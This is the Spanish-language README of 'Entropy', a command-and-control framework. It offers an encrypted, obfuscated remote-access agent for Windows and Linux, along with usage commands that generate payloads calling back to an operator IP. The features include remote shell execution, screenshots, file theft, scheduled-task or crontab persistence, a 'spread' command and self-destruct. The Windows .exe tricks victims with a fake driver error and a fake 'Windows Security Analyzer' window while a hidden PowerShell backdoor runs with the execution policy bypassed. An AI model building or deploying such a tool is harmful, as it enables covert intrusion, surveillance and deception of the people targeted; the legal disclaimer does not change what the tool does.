# Entropy C2 Framework

**Author:** jdb / httpbnry

**Entropy** es un framework de Mando y Control (C2) cliente-servidor para Windows y Linux, con cifrado AES-128-CBC + HMAC punto a punto. El agente Windows es 100% PowerShell (sin dependencias externas) y se compila a un `.exe` de ~46KB con mingw-w64.

---

### Funcionalidades

| Categoria | Caracteristicas |
|-----------|----------------|
| **Cifrado** | AES-128-CBC + HMAC-SHA256, compatible Python ↔ PowerShell |
| **CLI** | Interfaz por parametros estilo `generate` / `handler` con argparse |
| **Handler** | Shell interactiva multi-sesion, `cd`, `ps`, `screenshot`, `download`, `upload`, `ping`, `info`, `spread`, `selfdestruct` |
| **Agente Windows** | PowerShell puro, sin Python ni dependencias, AES + TCP nativo |
| **Agente Linux** | Python con AES-128-CBC + HMAC |
| **Ofuscacion** | 3 modos: `none` (legible), `xor` (XOR + base64), `packed` (zlib + base64 stub) |
| **EXE** | Compilacion a ejecutable Windows con mingw-w64 (`--exe`), ~46KB |
| **Falsa app** | Muestra "Windows Security Analyzer" con barra de progreso + MessageBox de error falso |
| **Persistencia** | Scheduled Task (Windows) / Crontab (Linux), comando `spread` |
| **Reconexion** | Bucle de reconexion cada 30s, reuso automatico de sesion |
| **Sesiones** | Multi-maquina simultaneo, reconexion persistente por hostname |
| **Autodestruccion** | Elimina persistencia, se borra del disco y sale |

## Arquitectura

```
+-----------------+    AES-128-CBC + HMAC    +-------------------+
|   Handler (C2)  | <----------------------> |  Agent (Victim)    |
|  (entropy.py)   |     TCP + cifrado        |  .ps1 / .py / .exe |
+-----------------+                          +-------------------+
```

## Requisitos

- Python 3.8+
- `pip install -r requirements.txt`
- Para compilar `.exe`: `sudo apt install mingw-w64`

## Uso rapido

```bash
# Generar payload Windows + .exe + auto-iniciar handler
python3 entropy.py generate --os windows --exe --run --ip 192.168.1.100

# Generar payload Linux
python3 entropy.py generate --ip 192.168.1.100 --port 4443

# Iniciar handler manualmente
python3 entropy.py handler --port 4443 --gen-key
```

### Comandos del agente

```
agent(#1)> help
  help          Show this help
  back          Return to handler
  ping          Check if agent is alive
  info          Show agent information
  cd <path>     Change working directory
  ps            List processes
  screenshot    Capture screen
  spread        Copy to system + create Scheduled Task
  download <p>  Download file from agent
  upload <l> [r]  Upload file to agent
  selfdestruct  Remove agent from system
  <command>     Execute any shell command
```

## Compilacion a EXE

El `.exe` se compila con `x86_64-w64-mingw32-gcc`. Cuando se ejecuta en Windows:
1. Muestra un MessageBox falso: *"Display Driver Error 0x887A0005"*
2. Extrae el script PowerShell a `%TEMP%\e.ps1`
3. Lo ejecuta oculto con `powershell -WindowStyle Hidden -ExecutionPolicy Bypass`

El PowerShell muestra una interfaz falsa de "Windows Security Analyzer" con barra de progreso mientras el backdoor opera en segundo plano.

## Protocolo

1. **Handshake**: agente envia `beacon|hostname|username` cifrado (AES-128-CBC + HMAC)
2. **Comandos**: prefijo de 4 bytes (big-endian) + payload cifrado
3. **Respuestas**: mismo formato (prefijo + datos cifrados)
4. **Comandos especiales**: prefijo `__command__|` para download/upload/cd/ps/screenshot/spread/selfdestruct

## Estructura

```
entropy/
+-- entropy.py           # Entry point principal
+-- modules/
|   +-- __init__.py
|   +-- crypto.py        # AES-128-CBC + HMAC-SHA256
|   +-- handler.py       # Servidor C2 y shell interactiva
|   +-- agent.py         # Templates (PS1/Python) + generacion + ofuscacion + compilacion
+-- payloads/            # Payloads generados
+-- requirements.txt     # Dependencias
```

## Nota legal

Esta herramienta se proporciona unicamente con fines educativos y de auditoria
de seguridad autorizada. El uso indebido para acceder a sistemas sin
consentimiento es ilegal. El autor no se responsabiliza del mal uso.
